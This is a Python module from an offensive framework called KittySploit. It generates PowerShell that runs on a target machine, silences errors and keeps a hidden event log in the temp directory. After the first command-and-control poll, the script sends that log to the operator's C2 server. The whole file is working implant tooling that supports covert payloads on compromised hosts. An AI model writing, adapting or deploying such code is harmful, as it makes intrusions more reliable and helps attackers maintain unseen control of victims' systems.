#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *
from core.payload_generation.prestage.telemetry_context import resolve_telemetry_context


class Module(Prestage):
    PRESTAGE_ID = "telemetry_buffer"

    __info__ = {
        "name": "Telemetry Buffer (PowerShell)",
        "description": "Persist bootstrap errors locally and flush them after the first C2 poll",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "dependencies": [],
        "tags": ["prestage", "offline", "telemetry", "powershell"],
    }

    buffer_path = OptString("", "Telemetry JSON path on target (default: temp/.kitty_telemetry.json)", False)

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        cfg = resolve_telemetry_context(self, context)
        buffer_path = cfg["buffer_path"]
        path_expr = f"'{buffer_path.replace(chr(39), chr(39)+chr(39))}'" if buffer_path else "[IO.Path]::Combine([IO.Path]::GetTempPath(), '.kitty_telemetry.json')"
        return f"""
$ErrorActionPreference='SilentlyContinue'
$global:_kittyTelemetryFlushed=$false
$global:_kittyTelemetryPath={path_expr}
function _KittyTelemetryLoad {{
  try {{
    if(Test-Path $global:_kittyTelemetryPath){{
      $raw=Get-Content $global:_kittyTelemetryPath -Raw -ErrorAction Stop
      $data=$raw | ConvertFrom-Json
      if($data.events){{
        return @{{ version=1; events=@($data.events) }}
      }}
    }}
  }} catch {{}}
  return @{{ version=1; events=@() }}
}}
function _KittyTelemetrySave($data) {{
  try {{
    $dir=[IO.Path]::GetDirectoryName($global:_kittyTelemetryPath)
    if($dir){{ [IO.Directory]::CreateDirectory($dir)|Out-Null }}
    $tmp=$global:_kittyTelemetryPath+'.tmp'
    ($data | ConvertTo-Json -Compress -Depth 6) | Set-Content -Path $tmp -Encoding UTF8
    Move-Item -Force $tmp $global:_kittyTelemetryPath
  }} catch {{}}
}}
function _KittyTelemetryRecord($phase,$event,$detail='') {{
  $data=_KittyTelemetryLoad
  $entry=@{{ ts=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); phase=[string]$phase; event=[string]$event; detail=([string]$detail).Substring(0,[Math]::Min(4000,([string]$detail).Length)) }}
  $data.events += ,$entry
  if($data.events.Count -gt 200){{ $data.events = $data.events[-200..($data.events.Count-1)] }}
  _KittyTelemetrySave $data
}}
function _KittyTelemetryPending {{
  return (_KittyTelemetryLoad).events.Count -gt 0
}}
function _KittyTelemetryFlushAfterPoll($postFn) {{
  if($global:_kittyTelemetryFlushed){{ return $false }}
  $data=_KittyTelemetryLoad
  if(-not $data.events -or $data.events.Count -eq 0){{ $global:_kittyTelemetryFlushed=$true; return $false }}
  try {{
    $body=(@{{ type='bootstrap_telemetry'; events=$data.events }} | ConvertTo-Json -Compress -Depth 6)
    & $postFn ([Text.Encoding]::UTF8.GetBytes($body))
    _KittyTelemetrySave @{{ version=1; events=@() }}
    $global:_kittyTelemetryFlushed=$true
    return $true
  }} catch {{
    _KittyTelemetryRecord 'telemetry' 'flush_failed' $_.Exception.Message
    return $false
  }}
}}
$global:_kitty_telemetry=@{{ path=$global:_kittyTelemetryPath; record=${{function:_KittyTelemetryRecord}}; pending=${{function:_KittyTelemetryPending}}; flush_after_poll=${{function:_KittyTelemetryFlushAfterPoll}} }}
""".strip()
